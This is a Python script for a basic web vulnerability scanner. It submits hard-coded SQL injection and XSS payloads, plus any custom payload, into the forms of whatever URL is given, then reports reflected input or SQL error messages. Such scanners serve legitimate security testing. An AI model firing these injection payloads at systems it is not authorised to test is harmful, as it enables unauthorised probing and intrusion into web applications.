import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys

# Common SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "admin' --",
    "' OR '' = '",
    "\" OR \"\" = \""
]

# Common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>"
]

HEADERS = {"User-Agent": "Mozilla/5.0"}

def get_all_forms(url):
    soup = BeautifulSoup(requests.get(url, headers=HEADERS).text, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": name, "value": value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        data[input["name"]] = input["value"]
    if form_details["method"] == "post":
        return requests.post(target_url, data=data, headers=HEADERS)
    else:
        return requests.get(target_url, params=data, headers=HEADERS)

def is_vulnerable_to_xss(response, payload):
    return payload in response.text

def is_vulnerable_to_sqli(response):
    errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "Microsoft OLE DB"
    ]
    for error in errors:
        if error in response.text.lower():
            return True
    return False

def scan_with_payloads(url, payloads, test_type):
    try:
        forms = get_all_forms(url)
        print(f"[+] Found {len(forms)} form(s) on {url}.")
        for form in forms:
            form_details = get_form_details(form)
            print(f"\n[!] Testing form at action: {form_details['action']}")

            for payload in payloads:
                print(f"    [-] Trying payload: {payload}")
                response = submit_form(form_details, url, payload)
                if test_type == "xss" and is_vulnerable_to_xss(response, payload):
                    print("    [!!!] XSS vulnerability detected!")
                elif test_type == "sqli" and is_vulnerable_to_sqli(response):
                    print("    [!!!] SQL Injection vulnerability detected!")
    except Exception as e:
        print(f"[X] Error during scan: {e}")

def custom_payload_mode(url):
    while True:
        mode = input("Enter test type (xss/sqli or 'back' to return, 'exit' to quit): ").strip().lower()
        if mode == "exit":
            print("Exiting...")
            sys.exit(0)
        elif mode == "back":
            return
        elif mode in ["xss", "sqli"]:
            break
        else:
            print("[X] Invalid mode. Please type 'xss', 'sqli', 'back', or 'exit'.")

    payload = input("Enter your custom payload (or type 'exit' to quit): ").strip()
    if payload.lower() == "exit":
        print("Exiting...")
        sys.exit(0)

    scan_with_payloads(url, [payload], mode)

def menu():
    print("\n=== Web Vulnerability Scanner ===")
    print("1. Scan using common SQLi payloads")
    print("2. Scan using common XSS payloads")
    print("3. Inject custom payload")
    print("0. Exit")
    return input("Select an option: ").strip()

if __name__ == "__main__":
    try:
        target_url = input("Enter the target URL: ").strip()
        while True:
            choice = menu()
            if choice == "1":
                scan_with_payloads(target_url, SQLI_PAYLOADS, "sqli")
            elif choice == "2":
                scan_with_payloads(target_url, XSS_PAYLOADS, "xss")
            elif choice == "3":
                custom_payload_mode(target_url)
            elif choice == "0" or choice.lower() == "exit":
                print("Exiting scanner. Goodbye!")
                break
            else:
                print("[X] Invalid option.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting.")
